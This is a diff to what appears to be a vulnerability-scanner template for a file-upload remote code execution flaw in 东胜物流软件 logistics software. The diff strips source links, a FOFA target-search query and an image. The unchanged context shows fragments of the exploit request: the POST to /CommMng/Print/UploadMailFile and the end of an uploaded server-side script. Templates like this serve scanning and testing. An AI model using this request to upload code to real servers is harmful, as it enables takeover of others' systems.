@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件 UploadMailFile 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eua7hhnvrgvfg6p3'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eua7hhnvrgvfg6p3
-    fofa: app="东胜物流软件-物流软件"
 http:
 - raw:
   - 'POST /CommMng/Print/UploadMailFile HTTP/1.1
@@ -67,9 +63,7 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243256388-5e9670c2-7405-4402-8fa4-da7aae4f3178.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
